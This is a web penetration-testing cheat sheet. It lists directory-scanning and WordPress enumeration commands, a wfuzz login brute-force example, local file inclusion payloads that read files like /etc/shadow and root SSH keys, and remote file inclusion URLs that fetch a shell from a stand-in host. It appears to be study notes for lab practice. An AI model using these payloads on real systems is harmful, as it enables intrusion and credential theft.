
## Step 1: ALWAYS LOOK AT THE SOURCE CODE OF THE WEBPAGE!

## 

## Common Wordlists to use for Web App Scanning: 

Common Wordlists to use for Web Directory Scanning: 
- /usr/share/wordlists/dirb/common.txt
- /usr/share/wordlists/dirbuster/*.txt
- /usr/share/wordlists/wfuzz/general/*.txt
- /usr/share/seclists/Discovery/Web-Content/

Common Wordlists to use for User Enumeration Scanning: 
- /usr/share/seclists/Usernames
- /usr/share/wordlists/dirbuster/apache-user-enum-2.0

## Web App Scanners

Nikto: 

- nikto --url <domain>

Wpscan:

- wpscan --url <domain>
- wpscan --url <domain> --enumerate ap at (All Plugins, All Themes)
- wpscan --url <domain> --enumerate u (Usernames)
- wpscan --url <domain> --enumerate v

Web Tools for Directory Scanning: 



Dirb: 

- dirb <domain>
- dirb <domain> <wordlist>

Gobuster: 

- gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file>
- gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file> -a Firefox (Custom Agent)
- gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html
- gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200"
- gobuster dir -e -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200"
- gobuster dir -v -e -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200"
- gobuster dir -v -e -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200" -o output.txt
- gobuster dir -s 200,204,301,302,307,403 -u 172.21.0.0 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'

Wfuzz:

- wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
- wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
- wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 http://testphp.vulnweb.com/userinfo.php (Post Requests)

- wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ (Fuzzing Cookies)

Dirsearch: 

- dirsearch /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 172.21.0.0 -e php

FFuF:

- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0
- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -b "COOKIE VALUE; security=low" -u http://172.21.0.0
- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0 -fc 403, 302, 200
- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: 172.21.0.0" -u http://172.21.0.0
- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.21.0.0 -timeout 5


Other Tools: 
- Burp Suite
- OWASP Zap
- Cadaver
- SQLMap
- Joomscan
- Feroxbuster


## Testing for LFI: 

https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf

Examples: 

http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd

Interesting Files:

Linux:
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa

Windows:

Windows:
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM



## Testing for RFI: 

http://example.com/index.php?page=http://callback.com/shell.txt
http://example.com/index.php?page=http://callback.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt

## Resources

- Turning LFI to RFI: https://l.avala.mp/?p=241